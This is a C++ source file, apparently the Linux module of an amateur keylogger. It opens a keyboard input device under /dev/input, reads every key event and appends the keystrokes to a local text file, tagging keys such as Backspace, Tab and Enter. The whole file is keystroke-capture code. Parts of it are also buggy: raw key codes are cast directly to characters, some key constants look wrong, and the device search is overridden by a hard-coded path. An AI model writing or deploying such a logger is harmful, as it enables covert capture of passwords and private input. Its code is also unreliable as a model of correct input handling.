//
// Created by skill on 11/1/2024.
//

#include "main.hpp"
#include "linux_logger.hpp"
#if defined(__linux__) || defined(__unix__)
#include <linux/input.h>
#include <linux/input-event-codes.h>






bool is_specia_key(int key)
{
    std::fstream file("test.txt",std::ios::out | std::ios::app );
    if(!file.is_open()) std::cerr << "FILE ERROR: INPUT IS NOT WRITTEN " << std::endl;

    //linux/input-event-codes.h Is where i got the key type(s)
    //^recntly figured that out TODO: replace the nemuric values to its defined key name (better readability)
    switch (key) {
        case KEY_BACKSPACE:
            file << "[BACKSPACE]";
        file.close();
        return true;
        case KEY_TAB:
            file << "[TAB]";
        file.close();
        return true;
        case KEY_ENTER:
            file << "[ENTER] + " << std::endl;
        file.close();
        return true;
        case 42:
            file << "[SHIFT IN]";
        file.close();
        return true;
        case 654:
            file << "[SHIFT OUT] " << std::endl;
        file.close();
        return true;
        case 856:
            file << "[ALT] " << std::endl;
        file.close();
        return true;
        default:
            file.close();
        return false;
    }
}

void one_time_creation() {
    std::fstream file;
    if(!file.is_open())
    {
        file.open("linux_devices", std::ios::in | std::ios::out | std::ios::trunc);

        file << exc("cat /proc/bus/input/devices");
        file.close();

    }
}


std::vector<std::string> find_keyboard() {
    std::vector<std::string> result;

    std::fstream temp_file = std::fstream("temp.txt", std::ios::in | std::ios::out | std::ios::trunc);

    if (!temp_file.is_open()) {
        std::cerr << "Can't open temp file" << std::endl;
        return {};
    }
    std::cout << exc("grep 'kbd' linux_devices > temp.txt") << std::endl;
    std::string line;

    while(std::getline(temp_file, line, ' ')) {

        if(line.find("event") != std::string::npos) {
            result.push_back(line);
        }

    }

    temp_file.close();
    return result;
}


int linux_keyboard()
{
    /*namespace is imporant to delay this function, since if it ain't delayed it will accidently output the code twice
     *  chrono namespace is to imporant the time units
     *  thread is for the sleep function
     */
    using namespace std::chrono;
    using namespace std::this_thread;

    std::fstream file("test.txt",std::ios::out | std::ios::app );


    for (auto i : find_keyboard()) {
        std::string device_input = "/dev/input/" + i;
        // std::cout << device_input.c_str() << std::endl;
        int device = open(device_input.c_str(), O_RDONLY);
        if (device ==-1) {
            std::cerr << "HALP" << std::endl;
            return 1;

        }
       std::cout <<device_input.c_str() << std::endl;
        device_input = "/dev/input/" + i;
        break; // this is just for now
    }

    std::string d = "/dev/input/event0";
    const char* device_input = (d.c_str());
    int device = open(device_input, O_RDONLY);
    if(device == -1) {
        std::cerr << "HALP" << std::endl;
        return 1;

    }
    if(file.is_open()) {

        struct input_event ev;

        while (true){

            if(ssize_t r = read(device, &ev, sizeof(struct input_event)); r < static_cast<ssize_t>(sizeof(ev))) {
                return 1;
            }
            if(ev.type == EV_KEY) {
                std::cout << ev.code << std::endl;
                if(!is_specia_key(ev.code)) {
                    file << static_cast<char>(ev.code); //converts u16 to a character
                    std::cout << static_cast<char>(ev.code);
                    file.flush();
                    sleep_until(system_clock::now() + milliseconds(10));
                }

            }
        }
    }
    close(device);
    file.close();
    return 0;
}

#endif
